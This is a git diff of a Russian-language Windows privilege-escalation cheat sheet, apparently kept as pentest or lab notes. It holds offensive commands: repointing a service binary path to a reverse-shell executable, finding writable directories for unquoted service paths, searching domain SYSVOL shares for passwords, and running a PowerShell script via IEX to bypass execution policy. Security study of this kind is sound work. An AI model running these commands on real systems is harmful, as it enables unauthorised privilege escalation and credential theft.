@@ -168,7 +168,12 @@ sc query daclsvc - информация о состянии службы (ста
 
 sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса
 
+# Узнать кто может писать в директорию
+
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
 # Service binary enumeration
+
 icacls "C:\xampp\apache\bin\httpd.exe"
 icalcs "C:\xampp\mysql\bin\mysqld.exe"
 
@@ -184,7 +189,6 @@ findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config
 
 
 
-Но перед этим нужно скачать exploit_suggester, например такой: GitHub - AonCyberLabs/Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
 
 Загрузка скриптов без получения разрешения на запуск POwerShell
 IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")
